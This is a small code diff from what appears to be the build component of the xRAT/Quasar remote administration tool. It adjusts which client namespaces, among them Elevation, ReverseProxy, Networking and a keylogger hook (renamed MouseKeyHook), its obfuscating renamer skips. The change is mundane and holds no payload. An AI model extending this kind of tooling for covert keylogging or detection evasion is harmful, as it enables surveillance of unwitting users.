@@ -57,12 +57,12 @@ namespace xServer.Core.Build
         private void RenameInType(TypeDefinition typeDef)
         {
             if (typeDef.Namespace == "xClient.Core"
-                || typeDef.Namespace == "xClient.Core.Elevation"
-                || typeDef.Namespace == "xClient.Core.Compression"
-                || typeDef.Namespace == "xClient.Core.Networking"
+                || typeDef.Namespace.StartsWith("xClient.Core.Elevation")
+                || typeDef.Namespace.StartsWith("xClient.Core.Compression")
+                || typeDef.Namespace.StartsWith("xClient.Core.Networking")
                 || typeDef.Namespace.StartsWith("ProtoBuf")
                 || typeDef.Namespace.StartsWith("xClient.Core.ReverseProxy")
-                || typeDef.Namespace.StartsWith("xClient.Core.Keylogger")
+                || typeDef.Namespace.StartsWith("xClient.Core.MouseKeyHook")
                 || typeDef.Namespace.StartsWith("xClient.Core.Packets")
                 || typeDef.HasInterfaces)
                 return;
